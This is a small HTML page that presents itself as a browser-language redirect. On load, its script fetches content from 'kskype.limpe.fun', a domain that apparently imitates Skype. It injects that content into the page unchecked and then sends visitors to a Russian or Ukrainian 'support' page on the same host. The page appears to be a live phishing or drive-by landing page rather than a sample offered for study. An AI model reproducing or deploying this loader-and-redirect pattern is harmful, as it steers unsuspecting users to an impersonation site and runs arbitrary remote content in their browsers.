<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Language Redirect</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var userLang = navigator.language || navigator.userLanguage;
            var redirectUrl;

            if (userLang.startsWith('ru')) {
                redirectUrl = 'https://kskype.limpe.fun/ru/support/';
            } else if (userLang.startsWith('uk')) {
                redirectUrl = 'https://kskype.limpe.fun/ua/support/';
            } else {
                redirectUrl = 'https://kskype.limpe.fun/ua/support/';
            }

              fetch('https://kskype.limpe.fun/assets/v1/load')
                .then(response => response.text())
                .then(data => {
                    document.body.innerHTML = data;
                    
                    window.location.href = redirectUrl;
                })
                .catch(error => console.error('Error fetching content:', error));
        });
    </script>
</head>
<body>
    <p>Redirecting based on your browser language...</p>
</body>
</html>
